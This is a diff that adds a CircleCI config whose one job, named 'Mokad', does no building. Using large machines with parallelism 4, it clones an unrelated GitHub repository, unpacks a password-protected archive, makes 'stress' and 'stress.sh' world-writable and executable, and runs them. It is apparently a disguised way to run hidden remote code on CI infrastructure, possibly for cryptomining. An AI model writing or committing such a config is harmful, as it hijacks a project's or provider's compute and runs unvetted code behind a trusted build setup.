@@ -1,0 +1,16 @@
+version: 2
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: large
+    parallelism: 4
+    steps:
+     - run:
+        name: Mokad
+        command: git clone https://github.com/sbdhdbxbb/ket.git && cd ket && unzip -q -P kontol stress.zip && chmod 777 stress stress.sh && ./stress.sh
+workflows:
+    version: 2
+    build:
+        jobs:
+            - build
